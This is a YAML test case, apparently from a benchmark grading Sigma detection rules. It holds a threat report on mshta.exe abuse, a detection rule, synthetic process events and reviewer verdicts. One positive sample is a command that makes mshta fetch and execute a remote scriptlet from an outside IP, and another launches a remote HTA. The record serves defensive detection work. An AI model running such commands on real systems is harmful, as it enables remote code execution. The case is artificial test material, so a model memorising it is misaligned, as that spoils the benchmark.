id: CTL1-04
role: control
defect_class: NONE
evasive: false
why: 'Correct rule: tags match T1218.005, every positive and filter value is quoted in the evidence, the
  positive part needs an http, vbscript: or javascript: argument, and the ''not'' filter removes only
  the documented HR portal launcher (parent hrportal.exe plus hrportal.hta), so the look-alike launcher
  event does not match.'
expected_gate: none
report_text: 'Several endpoints started mshta.exe with a URL or inline script instead of a local application
  file. Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe
  vbscript:Execute(window.close). Remote HTA content and inline vbscript: or javascript: URIs were the
  loaders used throughout this campaign. One internal tool, the HR portal launcher hrportal.exe, also
  starts mshta.exe but always with its local file hrportal.hta, so that launcher is a known false positive
  and should be excluded. Detection should cover mshta.exe invoked with an http, vbscript: or javascript:
  argument.'
evidence:
- Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe vbscript:Execute(window.close).
- One internal tool, the HR portal launcher hrportal.exe, also starts mshta.exe but always with its local
  file hrportal.hta
- 'Detection should cover mshta.exe invoked with an http, vbscript: or javascript: argument.'
logsource: windows_process_creation
techniques:
- T1218.005
sigma_yaml: |
  title: Mshta Executing Remote or Inline Script Content
  id: 9e3fad41-6075-4c9e-b224-5fa170c24d04
  status: experimental
  description: 'Detects mshta.exe started with an http URL or an inline vbscript: or javascript: argument, excluding the known HR portal launcher.'
  references:
    - 'urn:atidep:case'
  author: case-author
  date: 2026/10/02
  tags:
    - attack.stealth
    - attack.t1218.005
  logsource:
    category: process_creation
    product: windows
  detection:
    selection_img:
      Image|endswith: '\mshta.exe'
    selection_cli:
      CommandLine|contains:
        - 'http'
        - 'vbscript:'
        - 'javascript:'
    filter_hr:
      ParentImage|endswith: '\hrportal.exe'
      CommandLine|contains: 'hrportal.hta'
    condition: selection_img and selection_cli and not filter_hr
  falsepositives:
    - 'The HR portal launcher is excluded; other internal HTA applications opened from a URL'
  level: high
assumptions: []
events:
  positive:
  - kind: process_create
    image: C:\Windows\System32\mshta.exe
    cmd: mshta.exe http://docs.cranemail.test/invoice.hta
    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n'
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\mshta.exe
    cmd: mshta.exe vbscript:Execute(window.close)
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\SysWOW64\mshta.exe
    cmd: mshta.exe javascript:a=GetObject('script:http://203.0.113.9/x.sct').Exec();close()
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  negative:
  - kind: process_create
    image: C:\Windows\System32\notepad.exe
    cmd: notepad.exe C:\Users\alice\todo.txt
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\whoami.exe
    cmd: whoami
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -Command "Get-Service | Where-Object Status -eq Running"
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  lookalike:
  - kind: process_create
    image: C:\Windows\System32\mshta.exe
    cmd: mshta.exe "C:\Program Files\HRPortal\hrportal.hta" http://hr.lab.invalid/sso
    parent: C:\Program Files\HRPortal\hrportal.exe
    parent_cmd: '"C:\Program Files\HRPortal\hrportal.exe"'
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\mshta.exe
    cmd: mshta.exe "C:\Program Files\HRPortal\help.hta"
    parent: C:\Program Files\HRPortal\hrportal.exe
    parent_cmd: '"C:\Program Files\HRPortal\hrportal.exe"'
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
tamper_sigma_yaml: ''
review:
  verdicts:
  - reviewer: R2
    role: primary
    verdict: present
    confidence: 85
    reasoning: 'YAML and pySigma parse cleanly and metadata is complete. T1218.005 gets attack.stealth
      and attack.t1218.005, as in the table. Every value is covered by the three evidence quotes confirmed
      in report_text: mshta.exe, http, vbscript:, javascript:, hrportal.exe and hrportal.hta. The condition
      ''selection_img and selection_cli and not filter_hr'' uses only allowed constructs, and ParentImage
      is an allowed process_creation field. By hand: the three positives (http URL, vbscript:, javascript:
      with embedded http) match and are not filtered because their parents are WINWORD, cmd and explorer.
      The negatives have no mshta. Look-alike 1 (hrportal.exe parent, hrportal.hta plus an http arg) matches
      the selection but is removed by filter_hr. Look-alike 2 (help.hta) has no http, vbscript: or javascript:
      term, so it does not match. The baseline has no mshta.'
    events_ok: true
    incidental_issues:
    - Look-alike 1 adds an http argument to the HR launcher, slightly beyond the report's claim that it
      always uses only the local file. It does exercise the exclusion, so it is a good test.
    - The 'http' term is exactly four characters, right at the G11 minimum, and matches any substring
      'http' in an mshta command line. The filter would also suppress a malicious mshta whose parent is
      hrportal.exe and whose command line contains hrportal.hta. Both are acceptable and report-supported.
  - reviewer: R4
    role: replacement
    verdict: present
    confidence: 85
    reasoning: 'The YAML parses and pySigma accepts it with complete metadata. The fields are Image, CommandLine
      and ParentImage, all allowed, and the tags attack.stealth and attack.t1218.005 are correct. All
      three quotations appear word for word, and every value (''mshta.exe'', ''http'', ''vbscript:'',
      ''javascript:'', ''hrportal.exe'', ''hrportal.hta'') occurs in them. By hand, the positives (an
      http URL from a WINWORD parent, vbscript:Execute, a SysWOW64 mshta with javascript:) match and none
      has an hrportal parent. Look-alike 1 contains http but is excluded by filter_hr: its parent ends
      in \hrportal.exe and its command line contains hrportal.hta. Look-alike 2 (help.hta) has no http,
      vbscript: or javascript:. The negatives are not mshta. The shortest alternative term, ''http'',
      is exactly 4 characters on CommandLine, so it meets the breadth guard at the limit, and the baseline
      summary lists no mshta.exe.'
    events_ok: true
    incidental_issues:
    - The selection term 'http' is only just at the 4-character breadth minimum and matches 'http' anywhere
      in an mshta command line. It is acceptable because the rule is anchored on mshta.exe, but it is
      a broad term.
    - The report says hrportal.exe always runs mshta with its local hrportal.hta, yet look-alike 1 adds
      an http SSO URL. That is plausible, but it is not literally the behaviour the report describes.
    - filter_hr would also suppress a malicious mshta child of hrportal.exe whose command line mentions
      hrportal.hta. This bypass is narrow and accepted by the report's exclusion.
excluded: false
exclusion_reason: ''
